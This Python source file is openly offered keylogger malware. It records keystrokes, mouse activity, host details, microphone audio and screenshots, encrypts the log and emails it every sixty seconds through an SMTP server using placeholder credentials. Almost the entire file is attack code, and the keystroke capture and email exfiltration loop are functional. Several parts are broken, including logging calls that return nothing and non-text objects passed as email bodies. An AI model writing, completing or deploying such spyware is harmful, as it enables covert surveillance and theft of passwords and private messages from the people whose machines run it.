import logging
import os
import platform
import smtplib
import socket
import threading
import wave
import pyscreenshot
import sounddevice as sd
from pynput import keyboard
from pynput.keyboard import Listener
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from cryptography.fernet import Fernet
import glob

# Generate a key for encryption
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Configuration
EMAIL_ADDRESS = "YOUR_USERNAME"
EMAIL_PASSWORD = "YOUR_PASSWORD"
SEND_REPORT_EVERY = 60  # in seconds

class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started..."
        self.email = email
        self.password = password

    def appendlog(self, string):
        self.log = self.log + string

    def on_move(self, x, y):
        current_move = logging.info("Mouse moved to {} {}".format(x, y))
        self.appendlog(current_move)

    def on_click(self, x, y):
        current_click = logging.info("Mouse clicked at {} {}".format(x, y))
        self.appendlog(current_click)

    def on_scroll(self, x, y, dx, dy):
        current_scroll = logging.info("Mouse scrolled at {} {}".format(x, y))
        self.appendlog(current_scroll)

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "

        self.appendlog(current_key)

    def send_mail(self, email, password, message):
        try:
            sender = "Private Person <from@example.com>"
            receiver = "A Test User <to@example.com>"

            msg = MIMEMultipart()
            msg['From'] = sender
            msg['To'] = receiver
            msg['Subject'] = "Keylogger Report"

            msg.attach(MIMEText(message, 'plain'))

            with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
                server.login(email, password)
                server.sendmail(sender, receiver, msg.as_string())
        except Exception as e:
            logging.error(f"Failed to send email: {e}")

    def report(self):
        encrypted_log = cipher_suite.encrypt(self.log.encode())
        self.send_mail(self.email, self.password, encrypted_log.decode())
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        self.appendlog(f"Hostname: {hostname}\nIP: {ip}\nProcessor: {plat}\nSystem: {system}\nMachine: {machine}\n")

    def microphone(self):
        fs = 44100
        seconds = SEND_REPORT_EVERY
        obj = wave.open('sound.wav', 'w')
        obj.setnchannels(1)  # mono
        obj.setsampwidth(2)
        obj.setframerate(fs)
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        obj.writeframesraw(myrecording)
        sd.wait()

        self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)

    def screenshot(self):
        img = pyscreenshot.grab()
        self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)

    def run(self):
        self.system_information()
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
        with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
            mouse_listener.join()

if __name__ == "__main__":
    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()
